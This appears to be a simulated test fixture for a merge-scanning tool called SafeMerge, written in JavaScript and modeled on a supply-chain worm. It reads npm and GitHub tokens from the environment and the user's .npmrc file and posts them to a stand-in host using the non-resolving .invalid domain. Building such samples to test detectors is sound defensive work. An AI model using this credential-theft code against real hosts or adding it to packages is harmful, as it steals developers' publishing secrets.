// SIMULATED TEST FILE for SafeMerge. Modeled on the Shai-Hulud pattern.
// The host below uses the reserved .invalid TLD, which never resolves, so nothing is ever sent.
const https = require('https');
const fs = require('fs');
const os = require('os');
const path = require('path');

const npmToken = process.env.NPM_TOKEN;
const ghToken = process.env.GITHUB_TOKEN;
const npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');

const payload = JSON.stringify({ npmToken, ghToken, npmrc });
const req = https.request({ host: 'collector.example.invalid', path: '/upload', method: 'POST' });
req.write(payload);
req.end();
